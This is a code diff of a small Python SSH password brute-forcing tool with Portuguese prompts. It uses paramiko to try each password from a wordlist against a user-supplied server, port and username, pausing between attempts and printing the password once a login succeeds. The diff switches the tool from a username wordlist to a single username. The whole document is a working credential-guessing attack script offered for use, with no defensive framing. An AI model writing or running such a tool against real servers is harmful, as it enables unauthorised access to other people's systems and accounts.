@@ -5,7 +5,7 @@ from time import *
 
 servidor = input(colored("Digite o servidor: ",'blue')) 
 porta = input(colored("digite a porta do serviço ssh: ",'magenta'))
-nome = input(colored("Digite a wordlist do user: ",'yellow'))
+nome = input(colored("Digite O user: ",'yellow'))
 wl = input(colored("Digite a wordlist do password: ",'red'))
 t = input(colored("IFORME O TEMPO DE EXECUÇÃO ENTRE CADA REQUISIÇÃO:",'green'))
 tempo = int(t)
@@ -15,18 +15,15 @@ ssh.load_system_host_keys()
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 f= open(wl)
-nomes=open(nome)
 for palavra in f.readlines():
 	senha = palavra.strip()
-	for n in nomes.readlines():
-		ns = n.strip() 
 	try:
-		ssh.connect(servidor,port=porta,username=ns,password=senha)
+		ssh.connect(servidor,port=porta,username=nome,password=senha)
 	except paramiko.ssh_exception.AuthenticationException:
-		print (colored("Testando senha:",'red'),ns ,senha)
+		print (colored("Testando senha:",'red') ,senha)
 		
 		sleep(tempo)
 	else:
-		print (colored("[+++]senha encontrada >>>>",green),ns,senha)
+		print (colored("[+++]senha encontrada >>>>",green),senha)
 		break
 ssh.close
